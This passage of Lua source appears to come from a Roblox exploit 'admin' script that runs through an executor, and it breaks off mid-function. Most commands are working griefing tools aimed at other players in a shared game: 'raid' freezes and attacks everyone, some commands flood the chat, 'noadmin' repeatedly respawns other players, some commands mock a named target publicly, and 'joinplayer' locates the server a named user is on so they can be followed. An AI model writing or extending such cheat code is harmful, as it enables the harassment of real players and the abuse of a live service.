addCommand("playdrums",{"musicstring"},function(args)
    soundTableBongo = {
		["a"] = "HiHat",
		["b"] = "Snare",
		["c"] = "Tom2",
		["d"] = "Tom3",
		["e"] = "Crash",
		["f"] = "Tom1",
		["g"] = "Kick",
		["h"] = "Ride"
	}

local str = args[1]
	for i = 1, string.len(str) do
	    pcall(function()
	    PlayDrum(soundTableBongo[str:sub(i,i)])
		end)
		wait(2/15)
	end
end)

addCommand("soundspam",{"frequency","delay"},function(args)
    for i=1,args[1] do 
        game.Players:Chat("hat me 305888394")
        if tonumber(args[2])>0 then
        wait(tonumber(args[2]))
        end
    end
end)

addCommand("audiolog",{},function()
	if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound") then
		print("The song being played is "..workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").SoundId)
	end
	
	GUI:SendMessage(ScriptName,"Check the developer console for the logged audios.")
end)

addCommand("spamlogs",{},function()
    for i=1,50 do
        game.Players:Chat([[ff ███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
]])
wait()
    end
end)

addCommand("mute",{},function()
    Loops.mute = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        for i,v in pairs(workspace:GetDescendants()) do
            if v:IsA("Sound") then if v.Playing then v:Stop() end end
        end
    until not Loops.mute
end)

addCommand("unmute",{},function()
    Loops.mute = false
end)

addCommand("timepositionmusic",{"timeposition"},function(args)
    game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimePosition = args[1]
end)

addCommand("timepositionall",{"timeposition"},function(args)
    for i,v in pairs(workspace:GetDescendants()) do
        if v:IsA("Sound") then v.TimePosition = args[1] end
    end
end)

addCommand("iscrashed",{},function()
	return checkIsCrashed()
end)

addCommand("if",{"input","then/else","output"},function(args)
	local input = false
	if args[1]:lower() == "iscrashed" then input=checkIsCrashed() end
	if args[2] == "else" then input = not input end
	if input then
		local fixer = {args[4]}
    		for i=5, #args do
    		    table.insert(fixer,args[i])
    		end
		runCommand(prefix..args[3],fixer)
	end
end)

addCommand("loadregen",{"streamingdistance"},function(args)
    local AlreadyChecked = {}
local Range = 0
local streamingdistance = tonumber(args[1])
local RegenLoaded = false
while not RegenLoaded do
    for Y=0,Range do
        for X=Range*-1,Range do
            for Z=Range*-1,Range do
                if RegenLoaded then break end
                if not table.find(AlreadyChecked,CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance)) then
                    print("X: "..tostring(X).." / Y: "..tostring(Y).." / Z: "..tostring(Z))
                    table.insert(AlreadyChecked,CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance))
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance)
                    game:GetService("RunService").RenderStepped:Wait()
                    if game:GetService("Workspace").Terrain["_Game"].Admin:FindFirstChild("Regen") then
                        RegenLoaded = true
			print("Found regen pad!")
                    end
                end
            end
        end
    end
    if not RegenLoaded then Range = Range + 1 end
end
end)

addCommand("serverdata",{},function()

Loops.serverdata = true

local UI = Instance.new("ScreenGui",game.CoreGui)
UI.ResetOnSpawn = true
UI.Name = "iiStupidAdmin serverdata"

local FPS = Instance.new("TextLabel",UI)
FPS.AnchorPoint = Vector2.new(0,1)
FPS.Position = UDim2.new(0,0,1,0)
FPS.BackgroundTransparency = 1
FPS.TextColor3 = Color3.new(0,1,0)
FPS.Text = "FPS: yes"
FPS.TextSize = 20
FPS.Size = UDim2.new(0.1,0,0,30)
FPS.TextXAlignment = Enum.TextXAlignment.Left
FPS.TextYAlignment = Enum.TextYAlignment.Bottom

local Ping = Instance.new("TextLabel",UI)
Ping.AnchorPoint = Vector2.new(0,1)
Ping.Position = UDim2.new(0,0,1,-30)
Ping.BackgroundTransparency = 1
Ping.TextColor3 = Color3.new(0,1,0)
Ping.Text = "Ping: yes"
Ping.TextSize = 20
Ping.Size = UDim2.new(0.1,0,0,30)
Ping.TextXAlignment = Enum.TextXAlignment.Left
Ping.TextYAlignment = Enum.TextYAlignment.Bottom

local function Lerp(a, b, t)
    return a + (b - a) * t
end

local CurrentFPS = 1/game:GetService("RunService").RenderStepped:Wait()
repeat game:GetService("RunService").RenderStepped:Wait()
CurrentFPS = Lerp(CurrentFPS,1/game:GetService("RunService").RenderStepped:Wait(),0.1)
FPS.Text = "FPS: "..tostring(math.floor(CurrentFPS))
FPS.TextColor3 = Color3.fromRGB((127.5-math.clamp(CurrentFPS,0,127.5))*2,math.clamp(CurrentFPS,0,127.5)*2,0)

local CurrentPing = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():split(" ")[1])
Ping.Text = "Ping: "..math.floor(CurrentPing).."ms"
Ping.TextColor3 = Color3.fromRGB(math.clamp((math.clamp(CurrentPing,0,510))/2,0,255),math.clamp((510-math.clamp(CurrentPing,0,510))/2,0,255),0)
until not Loops.serverdata

UI:Destroy()

end)

addCommand("unserverdata",{},function()
	Loops.serverdata = false
end)

addCommand("loadbaseplate",{"streamingdistance"},function(args)
    local AlreadyChecked = {}
local Range = 0
local streamingdistance = tonumber(args[1])
local RegenLoaded = false
while not RegenLoaded do
    for Y=0,Range do
        for X=Range*-1,Range do
            for Z=Range*-1,Range do
                if RegenLoaded then break end
                if not table.find(AlreadyChecked,CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance)) then
                    print("X: "..tostring(X).." / Y: "..tostring(Y).." / Z: "..tostring(Z))
                    table.insert(AlreadyChecked,CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance))
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance)
                    game:GetService("RunService").RenderStepped:Wait()
                    if workspace.Terrain["_Game"].Workspace:FindFirstChild("Baseplate") then
                        RegenLoaded = true
			print("Found baseplate!")
                    end
                end
            end
        end
    end
    if not RegenLoaded then Range = Range + 1 end
end
end)

addCommand("soundtroll",{},function()
    Loops.soundtroll = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        for i,v in pairs(workspace:GetDescendants()) do
        if v:IsA("Sound") then 
            if v.Playing == false then v:Play() end v.TimePosition = math.random(0,v.TimeLength*100)/100 end
    end
    until not Loops.soundtroll
end)

addCommand("spawnkill",{},function()
    local obbydestroyed = false
    spawn(function()
        if game.Chat:FindFirstChild("Obby") then obbydestroyed = true runCommand(prefix.."localaddobby",{}) end
    end)
    wait()
    moveObject(game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump9,CFrame.new(-41.0650024, 1.30000007, -28.601058959961, 0, 0, -1, 0, 1, 0, 1, 0, 0))
if obbydestroyed then spawn(function()
    runCommand(prefix.."localremoveobby",{})
end) end
end)

addCommand("cagespawn",{},function()
    moveObject(game:GetService("Workspace").Terrain["_Game"].Workspace["Basic House"].SmoothBlockModel40,CFrame.new(-10.7921638, 17.3182983, -16.0743637, -0.999961913, -0.0085983118, 0.00151610479, -1.01120179e-08, 0.173648253, 0.98480773, -0.00873095356, 0.984770179, -0.173641637))
end)

addCommand("unsoundtroll",{},function()
    Loops.soundtroll = false
end)

addCommand("stopsoundtroll",{},function()
    runCommand(prefix.."unsoundtroll",{})
end)

addCommand("raid",{},function()
    Loops.raid = true
    repeat wait()
        pcall(function()
            if PersonsAdmin then
        game.Players:Chat("m/raided by "..ScriptName)
        else
           game.Players:Chat("m raided by "..ScriptName) 
        end
        local Player = GetPlayers("others")
        for i,v in pairs(Player) do
            for zxz,xzx in pairs(chr:GetDescendants())do if v:IsA("BasePart") then v.Velocity = Vector3.new(0,0,0)end end
            local pos = chr.HumanoidRootPart.CFrame
            game.Players:Chat("size "..v.Name.." nan")
            wait()
            game.Players:Chat("freeze "..v.Name)
            wait()
            for i=1,5 do
                game.Players:Chat("gear me 25741198")
                wait()
            end
            wait()
            for zxz,xzx in pairs(chr:GetDescendants())do if v:IsA("BasePart") then v.Velocity = Vector3.new(0,0,0)end end
            chr.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,7.5)
            wait(0.25)
            chr.HumanoidRootPart.Anchored=true
            wait(0.3)
            for i,v in pairs(plr.Backpack:GetChildren()) do
                v.Parent = chr
                wait()
                v:Activate()
                wait()
                v.Parent=workspace
                wait()
            end
            chr.HumanoidRootPart.Anchored=false
            chr.HumanoidRootPart.CFrame = pos
        end
        end)
    until not Loops.raid
end)

addCommand("buildswordfightingarena",{"player1","player2"},function(args)
    if PersonsAdmin then
    local partIndex = 1
local indexPosition = {
    CFrame.new(-130,5,-55),
    CFrame.new(-140,5,-55),
    CFrame.new(-150,5,-55),
    CFrame.new(-130,5,-65),
    CFrame.new(-140,5,-65),
    CFrame.new(-150,5,-65),
    CFrame.new(-130,5,-75),
    CFrame.new(-140,5,-75),
    CFrame.new(-150,5,-75),
    CFrame.new(-154, 8, -51),
    CFrame.new(-126, 8, -79),
    CFrame.new(-154, 8, -79),
    CFrame.new(-126, 8, -51),
    CFrame.new(-154, 9, -56, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-154, 9, -65, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-154, 9, -74, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-126, 9, -56, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-126, 9, -65, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-126, 9, -74, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-131, 9, -79, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-140, 9, -79, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-149, 9, -79, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-131, 9, -51, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-140, 9, -51, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-149, 9, -51, 0, 0, 1, 0, 1, 0, -1, 0, 0),
}
local origin = CFrame.new(-130, 3.7, -45)
chr.HumanoidRootPart.CFrame = origin
wait(0.25)
local basepart = Instance.new("Part",chr)
basepart.CFrame = CFrame.new(-140,5,-65)
basepart.Anchored = true
basepart.Transparency = 0.5
basepart.Size = Vector3.new(30,2.55,30)

local function teleportPeopleYes()
    for i,v in pairs(GetPlayers(args[1])) do
        chr.HumanoidRootPart.CFrame = CFrame.new(128.923386, 14, -53.6450806, 0.677816927, 3.43786546e-08, 0.735230744, 3.28579688e-08, 1, -7.70511051e-08, -0.735230744, 7.63847297e-08, 0.677816927)
        wait(0.25)game.Players:Chat("tp "..v.Name.." me")
    end
    wait(0.5)
    for i,v in pairs(GetPlayers(args[2])) do
        chr.HumanoidRootPart.CFrame = CFrame.new(151.167755, 14, -76.1952133, -0.709251344, -1.77910238e-08, -0.704955637, -4.14884234e-08, 1, 1.65041545e-08, 0.704955637, 4.09530934e-08, -0.709251344)
        wait(0.25)game.Players:Chat("tp "..v.Name.." me")
    end
end

Connections.arena = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(part)
    if part.Size == Vector3.new(10,2.5,10) or part.Size == Vector3.new(1,5,1) or part.Size == Vector3.new(1, 1, 9) then
        local localIndex = partIndex
        partIndex=partIndex+1
        if partIndex > 25 then teleportPeopleYes() Connections.arena:Disconnect() end
        spawn(function()
            while true do game:GetService("RunService").Heartbeat:Wait() if isnetworkowner(part) then
                part.Velocity = Vector3.new(-30,0,0)
                part.CanCollide = false
                part.CFrame = indexPosition[localIndex] else chr.HumanoidRootPart.CFrame = part.CFrame end
            end
        end)
    end
end)

for i=1,9 do
    game.Players:Chat("part/10/2.5/10")
    wait(0.5)
end
wait(0.5)
for i=1,4 do
    game.Players:Chat("part/1/5/1")
    wait(0.5)
end
wait(0.5)
for i=1,12 do
    game.Players:Chat("part/1/1/9")
    wait(0.5)
end
wait()
else
    GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.")
end
end)

addCommand("stopraid",{},function()
    Loops.raid = false
end)

addCommand("regen",{},function()
    fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector)
end)

addCommand("fixregen",{},function()
    moveObject(game:GetService("Workspace").Terrain["_Game"].Admin.Regen,CFrame.new(-7.16500044, 5.42999268, 91.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0))
end)

addCommand("fixadmin",{},function()
    local adminPadCFrames = {CFrame.new(-40.7649879, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-36.7649803, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-32.7649765, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-20.7649632, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-44.7649994, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-12.7649641, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-28.7649689, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-16.7649612, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-24.764967, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)}
    for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
        moveObject(v.Head,adminPadCFrames[i]*CFrame.new(0,4,0))
        wait(0.25)
    end
end)

addCommand("fixpads",{},function()
    runCommand(prefix.."fixadmin",{})
end)

addCommand("fixbaseplate",{},function()
    moveObject(workspace.Terrain["_Game"].Workspace.Baseplate,CFrame.new(-501, 0.100000001, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
end)

addCommand("autoadmin",{},function()
    Loops.autoadmin = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
            if v.Name ~= plr.Name.."'s admin" then
                firetouchinterest(chr.Head,v.Head,0)firetouchinterest(chr.Head,v.Head,1)
            end
        end
    until not Loops.autoadmin
end)

addCommand("dumbsound",{"player"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
        game.Players:Chat("speed "..v.Name.." 0")
        game.Players:Chat("music 131453190")
        wait(0.2)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3) * CFrame.Angles(0,math.rad(180),0)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({"Don't believe me?","All"}))
        wait(0.9)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({"Here,","All"}))
        wait(0.6)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({"I'll put you on.","All"}))
        wait(0.6)
        game.Players:Chat("gear me 212641536")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        boomba = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        boomba.Parent = game.Players.LocalPlayer.Character
        wait(1)
        boomba:Destroy()
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({"That's you!","All"}))
        game.Players:Chat("/e point")
        wait(0.9)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({"That's how dumb you sound!","All"}))
        wait(1)
        game.Players:Chat("music nan")
        game.Players:Chat("speed "..v.Name.." 16")
    end
end)

addCommand("smack",{"player"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
        game.Players:Chat("music 5886215922")
    	game.Players:Chat("speed "..v.Name.." 0")
    	game.Players:Chat("tp "..v.Name.." me")
    	spawn(function()
    	    wait(0.8)
    		game.Players:Chat("/e point")
    		game.Players:Chat("fling "..v.Name)
    	end)
    	wait(1.45)
    	game.Players:Chat("music nan")
	end
end)

addCommand("unautoadmin",{},function()
    Loops.autoadmin = false
end)

addCommand("loopgrab",{},function()
    runCommand(prefix.."autoadmin",{})
end)

addCommand("unloopgrab",{},function()
    runCommand(prefix.."unautoadmin",{})
end)

addCommand("lg",{},function()
    runCommand(prefix.."autoadmin",{})
end)

addCommand("unlg",{},function()
    runCommand(prefix.."unautoadmin",{})
end)

addCommand("perm",{},function()
    Loops.perm = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        padNames = {}
        for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
            table.insert(padNames,v.Name)
        end
        if not table.find(padNames,game.Players.LocalPlayer.Name.."'s admin") then
            if table.find(padNames,"Touch to get admin") then
                for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
                    if v.Name == "Touch to get admin" then
                        firetouchinterest(chr.Head,v.Head,0)firetouchinterest(chr.Head,v.Head,1)
                        break
                    end
                end
            else
                
            end
        end
    until not Loops.perm
end)

addCommand("unperm",{},function()
    Loops.perm = false
end)

addCommand("noperm",{},function()
    runCommand(prefix.."unperm",{})
end)

addCommand("noadmin",{},function()
    Loops.noadmin = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
            if v.Name ~= "Touch to get admin" then
                game.Players:Chat("respawn "..v.Name:split("'s admin")[1])
                fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector)
            end
        end
    until not Loops.noadmin
end)

addCommand("antiadmin",{},function()
    runCommand(prefix.."noadmin",{})
end)

addCommand("unnoadmin",{},function()
    Loops.noadmin = false
end)

addCommand("unantiadmin",{},function()
    runCommand(prefix.."unnoadmin",{})
end)

addCommand("afkindicator",{},function()
	local isFocused = true
	local cacheAntiName = Loops.antiname
	Connections.afkindicatora = game:GetService("UserInputService").WindowFocused:Connect(function()
		if cacheAntiName then
			spawn(function()
			runCommand(prefix.."antiname",{})
			end)
		end
		isFocused = true
	end)
	Connections.afkindicatorb = game:GetService("UserInputService").WindowFocusReleased:Connect(function()
		if Loops.antiname then
			cacheAntiName = true
			spawn(function()
			runCommand(prefix.."unantiname",{})
			end)
		end
		isFocused = false
	end)
	Loops.afkindicator = true
	repeat wait(0.5)
		if not isFocused then
if not game.Players.LocalPlayer.Character:FindFirstChild(game.Players.LocalPlayer.DisplayName.."\n[AFK]") then			
game.Players:Chat("name me "..game.Players.LocalPlayer.DisplayName.."\n[AFK]")
			end
		end
	until not Loops.afkindicator
end)

addCommand("unafkindicator",{},function()
	Loops.afkindicator = false
	Connections.afkindicatora:Disconnect()
	Connections.afkindicatorb:Disconnect()
end)

addCommand("adminprotect",{},function()
    Loops.adminprotect = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        pcall(function()
        local PadNames = {}
        for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
            if table.find(PadNames,v.Name) then
                local vname = v.Name
                v.Name = "stupid holder name so my script doesn't run the same thing 500 times"
                fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector)
                game.Players:Chat("respawn "..game.Players[vname:split("'s")[1]].Name)
                spawn(function()
                    wait(0.3)
                    GUI:SendMessage(ScriptName, "Please only grab a singular admin pad, "..game.Players[vname:split("'s")[1]].DisplayName..".")
                end)
            else
                if v.Name ~= "Touch to get admin" then
                    table.insert(PadNames,v.Name)
                end
            end
        end
        end)
    until not Loops.adminprotect
end)

addCommand("unadminprotect",{},function()
    Loops.adminprotect = false
end)

addCommand("gianticeblock",{},function()
    chr.HumanoidRootPart.CFrame = chr.HumanoidRootPart.CFrame*CFrame.new(0,-40,0)
    wait(0.25)
    game.Players:Chat("invisible me")
    wait()
    game.Players:Chat("freeze me")
    wait()
    game.Players:Chat("size me 10")
    wait()
    game.Players:Chat("clone me")
    wait()
    game.Players:Chat("respawn me")
end)

addCommand("dummy",{},function()
    local antiNameCache = Loops.antiname
if antiNameCache then Loops.antiname = false end
local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game.Players:Chat("char me 4463601211")
wait(0.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=pos
game.Players:Chat("face me 8560971")
game.Players:Chat("unpants me")
repeat wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Pants")
wait(0.1)
game.Players:Chat("name me Test Character")repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("Test Character")
game.Players:Chat("clone me")wait()
game.Players:Chat("unchar me")
wait(0.25)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=pos
if antiNameCache then spawn(function() runCommand(prefix.."antiname",{}) end) end
end)

addCommand("testdummy",{},function()
    runCommand(prefix.."dummy",{})
end)

addCommand("joinplayer",{"username"},function(args)
local silent = false
if args[2] then silent = true end
-- entirely bender's script not mine thx evant or event or whatever im sryy :cryingrn:
print("joining player mhm")
function JoinPlayer(plrID)
        -- Variables
        local userID = plrID
        local gameID = tostring(game.PlaceId)
        local httpService = game:GetService("HttpService")
        local servers, cursor = {}
    
        -- Error handling
        local success, response = pcall(function()
            -- API call
            local serverData = HttpRequest({
                Url = string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Desc&limit=100%s", gameID, cursor and "&cursor=" .. cursor or "")
            })
            cursor = serverData.nextPageCursor
            serverData = httpService:JSONDecode(serverData.Body)
    
            -- More Variables
            local playerHeadshot = HttpRequest({
                Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=".. userID .. "&size=150x150&format=Png&isCircular=false"
            })
            local playerImageURL = httpService:JSONDecode(playerHeadshot.Body).data[1].imageUrl
    
            -- Starting the player search
            for _, server in ipairs(serverData.data) do
                -- Looping through every player in the game to store their headshot
                local playerIcons = {}
                for i = 1, #server.playerTokens do
                    table.insert(playerIcons, {
                        token = server.playerTokens[i],
                        type = "AvatarHeadshot",
                        size = "150x150",
                        requestId = server.id
                    })
                end
    
                -- Pulling any server data from the headshot
                local postRequest = HttpRequest({
                    Url = "https://thumbnails.roblox.com/v1/batch",
                    Method = "POST",
                    Body = httpService:JSONEncode(playerIcons),
                    Headers = {
                        ["Content-Type"] = "application/json"
                    }
                })
                local recvServerData = httpService:JSONDecode(postRequest.Body).data
    
                -- Making sure there's no blank data
                if recvServerData then
			print("serverdata")
                    -- Check if the headshot is a match
                    for _, v in ipairs(recvServerData) do
			print(tostring(v.imageUrl))
                        if v.imageUrl == playerImageURL then
                            _G.foundPlayer = true
				print("join is success")
                            game:GetService("TeleportService"):TeleportToPlaceInstance(gameID, v.requestId)
                            return
                        end
                    end
                end
            end
        end)
    
        if not success then
            warn("An error occurred:", response)
        end
    end
print("function initialized")
local id=0
local Request = args[1]
local infoRequest = HttpRequest({Url="https://api.joinbender.com/roblox/LookupAPI/userinfo.php?username="..Request})
print("sent request")
for i, json in pairs(infoRequest) do
if (type(json) == "string") then
id=json:gsub('.*"id":(.-),.*', '%1')
print("found id")
print(id)
end
end
if id=='{"data":[]}' then
if not silent then
GUI:SendMessage(ScriptName, "Couldn't fetch a valid server from your request.")
end
print("no id :(")
return
end
if not silent then
GUI:SendMessage(ScriptName, "Attempting to join...")
end
print("id :)")
JoinPlayer(id)
print(" joining!!")
end)

addCommand("oldholdplayer",{"player"},function(args)
    local Player = GetPlayers(args[1])
for i,v in pairs(Player) do
    game.Players:Chat("speed "..v.Name.." 0")
    game.Players:Chat("freeze "..v.Name)
    game.Players:Chat("unfreeze "..v.Name)
    repeat wait() until v.Character:FindFirstChild("ice")
    v.Character.ice:Destroy()
    game.Players:Chat("gear me 74385399")
    repeat wait() until plr.Backpack:FindFirstChild("RemoteExplosiveDetonator")
    local Detonator = plr.Backpack:FindFirstChild("RemoteExplosiveDetonator")
    Detonator.Parent = chr
    plr.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame*CFrame.new(-0.5,0,1.5)
    wait(0.2)
    local A_1 = "Activate"
    local A_2 = v.Character.HumanoidRootPart.Position
    Detonator.RemoteEvent:FireServer(A_1, A_2)
    wait(0.3)
    Detonator:Destroy()
    game.Players:Chat("removetools me")
    game.Players:Chat("gear me 22787248")
    repeat wait() until plr.Backpack:FindFirstChild("Watermelon")
    plr.Backpack.Watermelon.Parent = chr
end
end)

addCommand("holdplayer",{"player"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		local vChar = v.Character
local plr = game.Players.LocalPlayer
local chr = plr.Character
local pos = chr.HumanoidRootPart.CFrame

game.Players:Chat("gear me 22787248")
repeat wait() until plr.Backpack:FindFirstChild("Watermelon")
local melon = plr.Backpack:FindFirstChild("Watermelon")
melon.Parent = chr
melon.GripPos = Vector3.new(2,-0.5,1.5)
wait()
game.Players:Chat("unsize me")
game.Players:Chat("stun "..v.Name)
wait(.2)
melon.Parent=workspace
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://178130996"
local k = chr.Humanoid:LoadAnimation(anim)
k:Play()
repeat game:GetService("RunService").RenderStepped:Wait() chr.HumanoidRootPart.CFrame=vChar.HumanoidRootPart.CFrame*CFrame.new(-1,1.5,4) until vChar:FindFirstChild("Watermelon")
k:Stop()
chr.HumanoidRootPart.CFrame = pos
	end
end)

addCommand("weldrightarm",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("speed "..v.Name.." 0")
        game.Players:Chat("freeze "..v.Name)
        game.Players:Chat("unfreeze "..v.Name)
        repeat wait() until v.Character:FindFirstChild("ice")
        v.Character.ice:Destroy()
        game.Players:Chat("gear me 74385399")
        repeat wait() until plr.Backpack:FindFirstChild("RemoteExplosiveDetonator")
        local Detonator = plr.Backpack:FindFirstChild("RemoteExplosiveDetonator")
        Detonator.Parent = chr
        plr.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,1.5)
        wait(0.2)
        local A_1 = "Activate"
        local A_2 = v.Character.HumanoidRootPart.Position
        Detonator.RemoteEvent:FireServer(A_1, A_2)
        wait(0.3)
    end
end)

addCommand("weldtorso",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("speed "..v.Name.." 0")
        game.Players:Chat("freeze "..v.Name)
        game.Players:Chat("unfreeze "..v.Name)
        repeat wait() until v.Character:FindFirstChild("ice")
        v.Character.ice:Destroy()
        game.Players:Chat("gear me 74385399")
        repeat wait() until plr.Backpack:FindFirstChild("RemoteExplosiveDetonator")
        local Detonator = plr.Backpack:FindFirstChild("RemoteExplosiveDetonator")
        Detonator.Parent = chr
        plr.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame*CFrame.new(-1.5,0,1.5)
        wait(0.2)
        local A_1 = "Activate"
        local A_2 = v.Character.HumanoidRootPart.Position
        Detonator.RemoteEvent:FireServer(A_1, A_2)
        wait(0.3)
    end
end)

addCommand("weldleftarm",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("speed "..v.Name.." 0")
        game.Players:Chat("freeze "..v.Name)
        game.Players:Chat("unfreeze "..v.Name)
        repeat wait() until v.Character:FindFirstChild("ice")
        v.Character.ice:Destroy()
        game.Players:Chat("gear me 74385399")
        repeat wait() until plr.Backpack:FindFirstChild("RemoteExplosiveDetonator")
        local Detonator = plr.Backpack:FindFirstChild("RemoteExplosiveDetonator")
        Detonator.Parent = chr
        plr.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame*CFrame.new(-2.5,0,1.5)
        wait(0.2)
        local A_1 = "Activate"
        local A_2 = v.Character.HumanoidRootPart.Position
        Detonator.RemoteEvent:FireServer(A_1, A_2)
        wait(0.3)
    end
end)

addCommand("altfreeze",{"player"},function(args)
	local Player = GetPlayers(args[1])
	for i,v in pairs(Player) do
game.Players:Chat("unff "..v.Name)
	local originalCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    game.Players:Chat("gear me 130113146")
	game.Players:Chat("speed "..v.Name.." 0")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
    local gun = game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
    gun.Parent = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Head.CFrame * CFrame.new(-1,-1,4)
wait(.3333)
	repeat wait() 
	 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Head.CFrame * CFrame.new(-1,-1,4)
	spawn(function()
	    local A_1 = "Click"
		local A_2 = true
		local A_3 = v.Character.Head.Position
		gun.ServerControl:InvokeServer(A_1, A_2, A_3)
	end)
	until v.Character.Head:FindFirstChildOfClass("SelectionBox")
	print("selectionbox :D")
	game.Players:Chat("reset me")
	wait(0.25)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=originalCFrame
end
end)

addCommand("attach",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("speed "..v.Name.." 0")
	game.Players:Chat("freeze "..v.Name)
	game.Players:Chat("unfreeze "..v.Name)
	repeat wait() until v.Character:FindFirstChild("ice")
	v.Character.ice:Destroy()
